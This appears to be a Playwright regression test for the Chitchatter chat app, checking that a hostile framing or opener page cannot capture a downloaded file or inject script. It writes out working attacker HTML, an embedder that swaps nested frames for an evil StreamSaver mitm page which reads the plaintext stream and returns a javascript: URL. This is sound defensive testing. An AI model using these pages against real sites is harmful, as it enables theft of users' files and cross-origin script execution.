import { createServer, Server } from 'node:http'
import { AddressInfo } from 'node:net'

import { Browser, BrowserContext, Page, expect, test } from '@playwright/test'

import { sendMessage } from '../helpers/test-helpers'

/**
 * Regression test for a hostile embedding page stealing a downloaded file.
 *
 * Chitchatter can be framed by any site. When the app saved a download
 * through StreamSaver it created a hidden cross-origin "mitm" iframe, posted
 * the decrypted file stream to it with targetOrigin `'*'`, and turned the
 * frame's reply into a new iframe URL. An ancestor frame may navigate any
 * descendant frame, so the embedding page could swap that iframe for its own
 * page, receive the plaintext, and reply with a `javascript:` URL that ran in
 * the Chitchatter origin.
 *
 * The attacker here is only a static page on another origin. It is not a room
 * peer and holds no secret. It frames the room and, on every tick, navigates
 * every nested frame of the app to its own replacement mitm page.
 */

// StreamSaver registers a service worker inside its mitm iframe; allow it so
// the unframed control download behaves as it does for real users.
test.use({ serviceWorkers: 'allow' })

// The attacker's pages are served by a real HTTP server rather than
// `page.route`: Chrome treats a routed response as coming from the public
// internet, and its Local Network Access checks would then refuse to let it
// frame the app on localhost. On the real web both sides are public.
const embedderPath = '/embed.html'
const openerPath = '/opener.html'
const evilMitmPath = '/evil-mitm.html'

// The E2E app uses the default StreamSaver page, the hardened fork's.
const streamSaverMitmUrl =
  'https://jeremyckahn.github.io/StreamSaver.js/mitm.html'

const fileName = 'secret.txt'
const fileContents = 'TOP-SECRET file content that only the recipient may read'

const embedderPage = (roomUrl: string, evilMitmUrl: string) => `<!doctype html>
<html><body>
<iframe id="f" src="${roomUrl}" width="1280" height="800"></iframe>
<script>
  window.__log = []
  const seen = new WeakSet()
  const sweep = () => {
    try {
      const kids = frames[0].frames
      for (let i = 0; i < kids.length; i++) {
        const w = kids[i]
        if (seen.has(w)) continue
        seen.add(w)
        try { w.location.href = ${JSON.stringify(evilMitmUrl)} } catch (e) {}
      }
    } catch (e) {}
  }
  setInterval(sweep, 0)
  ;(function raf () { sweep(); requestAnimationFrame(raf) })()
  addEventListener('message', e => { window.__log.push(e.data) })
</script>
</body></html>`

const evilMitmPage = `<!doctype html>
<html><body><script>
  addEventListener('message', e => {
    const port = e.ports && e.ports[0]
    top.postMessage({ stage: 'mitm-message', hasPort: !!port }, '*')
    if (!port) return
    port.onmessage = async m => {
      if (!m.data || !m.data.readableStream) return
      port.postMessage({
        download: "javascript:void(top.postMessage({ stage: 'js-url-iframe', origin: origin }, '*'))",
      })
      const reader = m.data.readableStream.getReader()
      const parts = []
      for (;;) {
        const { done, value } = await reader.read()
        if (done) break
        parts.push(...value)
      }
      top.postMessage({
        stage: 'plaintext',
        text: new TextDecoder().decode(new Uint8Array(parts)),
      }, '*')
    }
  })
</script></body></html>`

/**
 * The popup variant of the attack: the attacker opens the room in a window of
 * its own instead of framing it. The app is then top-level and streams
 * through StreamSaver, so the attacker tries to navigate the popup's nested
 * frames from the opener.
 */
const openerPage = (roomUrl: string, evilMitmUrl: string) => `<!doctype html>
<html><body>
<button id="open">Open room</button>
<script>
  window.__log = []
  addEventListener('message', e => { window.__log.push(e.data) })
  document.getElementById('open').addEventListener('click', () => {
    const popup = open(${JSON.stringify(roomUrl)}, '_blank', 'popup')
    const seen = new WeakSet()
    setInterval(() => {
      try {
        for (let i = 0; i < popup.frames.length; i++) {
          const w = popup.frames[i]
          if (seen.has(w)) continue
          seen.add(w)
          try {
            w.location.href = ${JSON.stringify(evilMitmUrl)}
            window.__log.push({ stage: 'navigated-popup-frame' })
          } catch (e) {
            window.__log.push({ stage: 'navigation-refused' })
          }
        }
      } catch (e) {}
    }, 0)
  })
</script>
</body></html>`

interface AttackerLogEntry {
  stage?: unknown
  hasPort?: unknown
}

const readAttackerLog = (page: Page): Promise<AttackerLogEntry[]> =>
  page.evaluate(() => {
    // The embedder page above defines __log; it is not part of Window's type.
    const log: unknown = Reflect.get(window, '__log')

    return Array.isArray(log) ? log : []
  })

/**
 * Resolves to null rather than throwing when no download arrives, so the test
 * can report what the attacker captured, which explains the missing download.
 */
const readDownload = async (page: Page, trigger: () => Promise<void>) => {
  const downloadPromise = page
    .waitForEvent('download', { timeout: 20000 })
    .catch(() => null)

  await trigger()
  const download = await downloadPromise

  if (!download) return null

  const chunks: Buffer[] = []

  for await (const chunk of await download.createReadStream()) {
    chunks.push(Buffer.from(chunk))
  }

  return {
    suggestedFilename: download.suggestedFilename(),
    contents: Buffer.concat(chunks).toString(),
  }
}

const startAttackerServer = async (roomUrl: string) => {
  let evilMitmRequests = 0
  // 127.0.0.1 is a different origin from the app's localhost.
  const host = '127.0.0.1'
  const server = createServer((request, response) => {
    const { port } = server.address() as AddressInfo // listening, so not null
    const origin = `http://${host}:${port}`

    if (request.url === embedderPath) {
      response.writeHead(200, { 'Content-Type': 'text/html' })
      response.end(embedderPage(roomUrl, `${origin}${evilMitmPath}`))
      return
    }

    if (request.url === openerPath) {
      response.writeHead(200, { 'Content-Type': 'text/html' })
      response.end(openerPage(roomUrl, `${origin}${evilMitmPath}`))
      return
    }

    if (request.url === evilMitmPath) {
      evilMitmRequests++
      response.writeHead(200, { 'Content-Type': 'text/html' })
      response.end(evilMitmPage)
      return
    }

    response.writeHead(404).end()
  })

  await new Promise<void>(resolve => server.listen(0, host, resolve))
  // server.address() is an AddressInfo once a TCP server is listening.
  const { port } = server.address() as AddressInfo

  return {
    server,
    origin: `http://${host}:${port}`,
    evilMitmRequestCount: () => evilMitmRequests,
  }
}

const createOfferingPeer = async (browser: Browser) => {
  const context = await browser.newContext()
  const page = await context.newPage()

  await page.goto('/')
  await page.waitForLoadState('networkidle')
  await page.getByRole('button', { name: /join public room/i }).click()
  await page.waitForURL(/\/public\/.+/)

  return { context, page, roomUrl: page.url() }
}

test.describe('Hostile embedding page', () => {
  test.setTimeout(90 * 1000)

  for (const variant of [
    { name: 'SDK embed URL', query: '?embed=1' },
    { name: 'plain iframe', query: '' },
  ]) {
    test(`cannot read a downloaded file or run script in the app origin (${variant.name})`, async ({
      browser,
    }) => {
      let peerContext: BrowserContext | undefined
      let victimContext: BrowserContext | undefined
      let attackerServer: Server | undefined

      try {
        const peer = await createOfferingPeer(browser)

        peerContext = peer.context

        const attacker = await startAttackerServer(
          `${peer.roomUrl}${variant.query}`
        )

        attackerServer = attacker.server

        victimContext = await browser.newContext({
          acceptDownloads: true,
          // Wide enough for the framed app to open its peer list, which holds
          // the Download button, by default.
          viewport: { width: 1400, height: 900 },
        })
        const victim = await victimContext.newPage()

        await victim.goto(`${attacker.origin}${embedderPath}`)

        const room = victim.frameLocator('#f')

        // Wait until the peers are connected to one another
        const greeting = 'Hello before the file'

        await sendMessage(peer.page, greeting)
        await expect(room.getByText(greeting)).toBeVisible({ timeout: 25000 })

        await peer.page.locator('#file-upload').setInputFiles({
          name: fileName,
          mimeType: 'text/plain',
          buffer: Buffer.from(fileContents),
        })

        const downloadButton = room.getByRole('button', {
          name: /download files being offered/i,
        })

        await expect(downloadButton).toBeVisible({ timeout: 25000 })

        // Download twice: the report showed a persistent mitm frame could be
        // re-captured on a second download.
        for (let attempt = 0; attempt < 2; attempt++) {
          const download = await readDownload(victim, () =>
            downloadButton.click()
          )

          // Give a late-arriving attacker message time to land.
          await victim.waitForTimeout(1000)

          // The attacker gets nothing...
          const log = await readAttackerLog(victim)
          const stages = log.map(entry => entry.stage)

          expect(stages).not.toContain('plaintext')
          expect(stages).not.toContain('js-url-iframe')
          expect(log.filter(entry => entry.hasPort === true)).toEqual([])
          // While framed, the app no longer creates a StreamSaver frame at
          // all, so the attacker never even gets a frame to swap.
          expect(attacker.evilMitmRequestCount()).toBe(0)

          // ...and the victim still gets the genuine file.
          expect(download?.suggestedFilename).toBe(fileName)
          expect(download?.contents).toBe(fileContents)
          await expect(downloadButton).toBeVisible()
        }
      } finally {
        await peerContext?.close()
        await victimContext?.close()
        attackerServer?.closeAllConnections()
        await new Promise(resolve => attackerServer?.close(resolve))
      }
    })
  }
})

/**
 * How long the in-memory save is held back after the Download click. Chrome
 * expires a click's transient user activation after 5 seconds.
 */
const delayedSaveMs = 6000

const appOrigin = 'http://localhost:3000'

test.describe('Framed download that outlives the click', () => {
  test.setTimeout(90 * 1000)

  // While framed, the app saves only once the whole file has arrived, so a
  // large or slow transfer saves long after the click. Browsers may refuse a
  // download a cross-origin frame starts without a live user activation; this
  // checks Chitchatter's in-memory save still works then.
  test('still saves the file once the click has expired', async ({
    browser,
  }) => {
    let peerContext: BrowserContext | undefined
    let victimContext: BrowserContext | undefined
    let attackerServer: Server | undefined

    try {
      const peer = await createOfferingPeer(browser)

      peerContext = peer.context

      const attacker = await startAttackerServer(peer.roomUrl)

      attackerServer = attacker.server

      victimContext = await browser.newContext({
        acceptDownloads: true,
        viewport: { width: 1400, height: 900 },
      })

      // Stand-in for a slow transfer: activation expiry depends only on time
      // since the click, so holding back the app's blob: save is enough.
      await victimContext.addInitScript(
        ({ origin, delayMs }) => {
          if (window.location.origin !== origin) return

          const { click } = HTMLAnchorElement.prototype

          // A prototype method needs `this`, so this cannot be an arrow
          // function.
          HTMLAnchorElement.prototype.click = function () {
            if (!this.href.startsWith('blob:')) {
              click.call(this)
              return
            }

            // The app removes its anchor right after clicking it.
            const anchor = this

            setTimeout(() => {
              Reflect.set(
                window,
                '__activeAtSave',
                navigator.userActivation.isActive
              )
              document.body.appendChild(anchor)
              click.call(anchor)
              anchor.remove()
            }, delayMs)
          }
        },
        { origin: appOrigin, delayMs: delayedSaveMs }
      )

      const victim = await victimContext.newPage()

      await victim.goto(`${attacker.origin}${embedderPath}`)

      const room = victim.frameLocator('#f')
      const greeting = 'Hello before the slow file'

      await sendMessage(peer.page, greeting)
      await expect(room.getByText(greeting)).toBeVisible({ timeout: 25000 })

      await peer.page.locator('#file-upload').setInputFiles({
        name: fileName,
        mimeType: 'text/plain',
        buffer: Buffer.from(fileContents),
      })

      const downloadButton = room.getByRole('button', {
        name: /download files being offered/i,
      })

      await expect(downloadButton).toBeVisible({ timeout: 25000 })

      const download = await readDownload(victim, () => downloadButton.click())

      const appFrame = victim
        .frames()
        .find(frame => frame.url().startsWith(appOrigin))

      // The save really did happen without a live user activation...
      expect(
        await appFrame?.evaluate(() => Reflect.get(window, '__activeAtSave'))
      ).toBe(false)
      // ...and the file still arrived intact.
      expect(download?.suggestedFilename).toBe(fileName)
      expect(download?.contents).toBe(fileContents)
    } finally {
      await peerContext?.close()
      await victimContext?.close()
      attackerServer?.closeAllConnections()
      await new Promise(resolve => attackerServer?.close(resolve))
    }
  })
})

test.describe('Hostile opener page', () => {
  test.setTimeout(90 * 1000)

  test("cannot read a downloaded file by navigating the popup's frames", async ({
    browser,
  }) => {
    let peerContext: BrowserContext | undefined
    let victimContext: BrowserContext | undefined
    let attackerServer: Server | undefined

    try {
      const peer = await createOfferingPeer(browser)

      peerContext = peer.context

      const attacker = await startAttackerServer(peer.roomUrl)

      attackerServer = attacker.server

      victimContext = await browser.newContext({
        acceptDownloads: true,
        viewport: { width: 1400, height: 900 },
      })

      const opener = await victimContext.newPage()

      await opener.goto(`${attacker.origin}${openerPath}`)

      const popupPromise = victimContext.waitForEvent('page')

      await opener.getByRole('button', { name: 'Open room' }).click()

      const room = await popupPromise

      await room.setViewportSize({ width: 1400, height: 900 })

      const greeting = 'Hello in the popup'

      await sendMessage(peer.page, greeting)
      await expect(room.getByText(greeting)).toBeVisible({ timeout: 25000 })

      await peer.page.locator('#file-upload').setInputFiles({
        name: fileName,
        mimeType: 'text/plain',
        buffer: Buffer.from(fileContents),
      })

      const downloadButton = room.getByRole('button', {
        name: /download files being offered/i,
      })

      await expect(downloadButton).toBeVisible({ timeout: 25000 })

      const download = await readDownload(room, () => downloadButton.click())

      // Give a late-arriving attacker message time to land.
      await room.waitForTimeout(1000)

      const stages = (await readAttackerLog(opener)).map(entry => entry.stage)

      // The popup is top-level, so it streams through StreamSaver's frame...
      expect(
        room.frames().some(frame => frame.url() === streamSaverMitmUrl)
      ).toBe(true)
      // ...and the opener tried to swap it, but the browser refused: an opener
      // may navigate the popup itself, not frames nested inside it.
      expect(stages).toContain('navigation-refused')
      expect(stages).not.toContain('navigated-popup-frame')
      expect(attacker.evilMitmRequestCount()).toBe(0)
      expect(stages).not.toContain('plaintext')
      expect(stages).not.toContain('js-url-iframe')

      expect(download?.suggestedFilename).toBe(fileName)
      expect(download?.contents).toBe(fileContents)
    } finally {
      await peerContext?.close()
      await victimContext?.close()
      attackerServer?.closeAllConnections()
      await new Promise(resolve => attackerServer?.close(resolve))
    }
  })
})
